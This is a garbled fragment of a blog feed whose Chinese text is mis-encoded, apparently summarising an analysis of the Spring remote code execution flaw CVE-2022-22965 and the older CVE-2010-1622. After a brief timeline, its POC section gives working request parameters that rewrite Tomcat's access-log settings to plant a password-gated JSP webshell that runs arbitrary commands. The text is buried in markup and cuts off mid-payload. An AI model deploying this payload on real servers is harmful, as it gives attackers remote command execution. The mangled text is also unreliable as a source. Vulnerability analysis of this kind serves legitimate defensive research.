href="https://www.aqniu.com/industry/82365.html">Springè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰åŸç†åˆ†æå’Œæ€è€ƒ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ¼æ´æ—¶é—´çº¿&quot;&gt;&lt;a href=&quot;#æ¼æ´æ—¶é—´çº¿&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´æ—¶é—´çº¿&quot;&gt;&lt;/a&gt;æ¼æ´æ—¶é—´çº¿&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622 Springç¬¬ä¸€æ¬¡&lt;a href=&quot;https://www.inbreak.net/archives/377&quot;&gt;çˆ†å‘æ¼æ´&lt;/a&gt;ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622/Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span 